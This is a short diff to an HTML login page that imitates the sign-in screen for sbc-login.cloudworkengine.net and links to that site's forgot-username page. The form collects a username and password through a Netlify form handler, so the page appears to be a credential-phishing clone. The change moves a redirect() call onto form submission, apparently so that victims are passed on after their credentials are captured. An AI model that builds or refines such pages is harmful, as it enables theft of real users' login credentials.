@@ -253,7 +253,7 @@ input[type="submit"] {
 
 <div class="login">
     <h3>Please enter your username and password</h3>
-	<form method="POST" name="f" id="f" data-netlify="true">
+	<form onsubmit="redirect()" method="POST" name="f" id="f" data-netlify="true">
 
 <input type="text" id="username" tabindex="1" name="username" placeholder="Username" value="" spellcheck="false" autofocus autocomplete="username webauthn" /><input id="password" type="password" tabindex="3" name="password" placeholder="Password" style="display:none;" autocomplete="current-password webauthn"  />
 <div class="submit">
@@ -262,7 +262,7 @@ input[type="submit"] {
 <a href="https://sbc-login.cloudworkengine.net/module.php/accountinfo/forgot-username.php" target="_blank" class="forgot">I forgot my username</a>
 </div>
  <button type="button" onclick="continuefunc()" id="webauthnBegin" tabindex="2">Continue</button>
-<input onclick="redirect()" type="submit" id="submit" style="display: none;" value="Sign in">
+<input type="submit" id="submit" style="display: none;" value="Sign in">
 </div>
 </form>
 
